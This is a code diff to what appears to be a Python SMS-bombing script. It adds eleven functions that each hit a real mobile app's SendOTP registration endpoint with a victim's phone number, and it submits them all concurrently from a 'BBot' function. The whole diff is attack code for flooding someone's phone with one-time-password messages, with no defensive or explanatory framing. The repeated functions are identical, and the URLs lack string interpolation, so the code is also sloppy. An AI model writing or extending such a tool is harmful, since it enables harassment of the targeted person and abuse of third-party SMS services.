@@ -160,6 +160,39 @@ def cang31(phone):
 def cang32(phone):
         requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
 
+def cang33(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang34(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang35(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang36(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang37(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang38(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang39(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang40(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang41(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang42(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang43(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
 
     
     
@@ -208,6 +241,17 @@ def BBot(phone, amount):
         threading.submit(cang30,phone)
         threading.submit(cang31,phone)
         threading.submit(cang32,phone)
+        threading.submit(cang33,phone)
+        threading.submit(cang34,phone)
+        threading.submit(cang35,phone)
+        threading.submit(cang36,phone)
+        threading.submit(cang37,phone)
+        threading.submit(cang38,phone)
+        threading.submit(cang39,phone)
+        threading.submit(cang40,phone)
+        threading.submit(cang41,phone)
+        threading.submit(cang42,phone)
+        threading.submit(cang43,phone)
         
         
 
